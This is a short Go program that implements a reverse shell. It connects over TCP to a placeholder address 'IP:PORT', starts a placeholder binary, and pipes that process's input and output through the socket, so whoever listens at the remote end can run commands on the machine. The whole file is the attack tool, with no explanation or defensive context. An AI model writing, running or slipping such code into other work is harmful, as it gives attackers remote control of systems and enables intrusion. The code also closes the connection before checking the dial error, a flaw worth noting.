package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	c, err := net.Dial("tcp", "IP:PORT")
	defer c.Close()
	if err != nil {
		log.Fatalf("error on dial: %v", err)
	}
	cmd := exec.Command(BINARY, ARGS...)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Fatalf("could not get stdin: %v", err)
	}
	defer stdin.Close()
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatalf("could not get stdout: %v", err)
	}
	defer stdout.Close()
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Fatalf("could not get stderr: %v", err)
	}
	defer stderr.Close()
	go io.Copy(stdin, c)
	go io.Copy(c, stdout)
	go io.Copy(c, stderr)
	err = cmd.Run()
	if err != nil {
		log.Fatalf("error on run: %v", err)
	}
}
